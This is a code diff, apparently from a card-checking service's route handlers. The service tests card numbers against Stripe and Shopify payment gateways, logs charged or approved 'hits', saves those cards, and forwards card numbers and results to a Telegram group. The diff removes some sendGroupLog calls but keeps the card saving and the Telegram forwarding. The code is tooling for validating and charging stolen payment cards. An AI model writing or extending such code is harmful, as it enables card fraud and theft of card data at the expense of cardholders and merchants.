@@ -1643,7 +1643,6 @@ export async function registerRoutes(
 
           if (isHit) {
             const userName = [req.session.firstName, req.session.lastName].filter(Boolean).join(" ") || req.session.username || req.session.userId;
-            sendGroupLog(userName, req.session.userId, cardClean, gateway, responseStr, "checker");
             saveChargedCC(cardClean, gateway, req.session.userId, userName);
             sendLogsGroupTelegram(cardClean, gateway, responseStr, parsed.status === "charged" ? "CHARGED" : "APPROVED", userName, req.session.userId);
             addActivity({
@@ -1806,7 +1805,6 @@ export async function registerRoutes(
           }
 
           if (isBatchHit) {
-            sendGroupLog(job.userName, job.userId, card, job.gateway, resultResponse, "auto_shopify");
             saveChargedCC(card, job.gateway, job.userId, job.userName);
             sendLogsGroupTelegram(card, job.gateway, resultResponse, result.status === "charged" ? "CHARGED" : "APPROVED", job.userName || job.userId, job.userId);
             addActivity({
@@ -2563,8 +2561,6 @@ export async function registerRoutes(
 
         incrementUsage(req.session.userId, "hitterHits");
         incrementIpHitterUsage(reqIp);
-        const siteForLog = getUserSiteVisible(req.session.userId) ? merchantName : "__hidden__";
-        sendGroupLog(userName, req.session.userId, cardClean, "Stripe CO", data.message || "Charged", "auto_hitter", siteForLog, amount, merchantName);
         saveChargedCC(cardClean, "Stripe CO", req.session.userId, userName);
         addActivity({
           type: "hit",
@@ -2707,8 +2703,6 @@ export async function registerRoutes(
 
         incrementUsage(req.session.userId, "hitterHits");
         incrementIpHitterUsage(reqIp);
-        const siteForLog = getUserSiteVisible(req.session.userId) ? merchantName : "__hidden__";
-        sendGroupLog(userName, req.session.userId, cardClean, "Stripe Invoice", data.message || "Charged", "auto_hitter", siteForLog, amount, merchantName);
         saveChargedCC(cardClean, "Stripe Invoice", req.session.userId, userName);
         addActivity({
           type: "hit",
@@ -2848,8 +2842,6 @@ export async function registerRoutes(
         incrementUsage(req.session.userId, "hitterHits");
         incrementIpHitterUsage(billingReqIp);
         const gateName = data.status === "charged" ? "Stripe Billing" : "Stripe Billing (Approved)";
-        const billingSiteForLog = getUserSiteVisible(req.session.userId) ? site : "__hidden__";
-        sendGroupLog(userName, req.session.userId, cardClean, gateName, data.message || "Approved", "auto_hitter", billingSiteForLog, "", site);
         if (data.status === "charged") {
           saveChargedCC(cardClean, "Stripe Billing", req.session.userId, userName);
         }
